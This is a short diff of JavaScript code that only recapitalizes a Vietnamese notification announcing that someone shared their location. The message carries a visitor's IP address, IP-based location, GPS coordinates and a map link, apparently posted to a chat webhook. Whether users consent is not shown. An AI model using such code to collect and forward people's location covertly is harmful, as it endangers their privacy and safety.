@@ -316,12 +316,12 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           content:
-            `📍 **Có người vừa chia sẻ vị trí**\n` +
+            `📍 **Có Người Vừa Chia Sẻ Vị Trí**\n` +
             `IP: ${payload.ip}\n` +
-            `Vị trí theo IP: ${payload.ipLoc}\n` +
-            `Toạ độ GPS: ${payload.lat}, ${payload.lng} (±${payload.acc}m)\n` +
-            `Bản đồ: https://www.openstreetmap.org/?mlat=${payload.lat}&mlon=${payload.lng}#map=16/${payload.lat}/${payload.lng}\n` +
-            `Thời gian: ${new Date().toLocaleString('vi-VN')}`
+            `Vị trí Theo IP: ${payload.ipLoc}\n` +
+            `Toạ Độ GPS: ${payload.lat}, ${payload.lng} (±${payload.acc}m)\n` +
+            `Bản Đồ: https://www.openstreetmap.org/?mlat=${payload.lat}&mlon=${payload.lng}#map=16/${payload.lat}/${payload.lng}\n` +
+            `Thời Gian: ${new Date().toLocaleString('vi-VN')}`
         })
       });
     }catch(err){
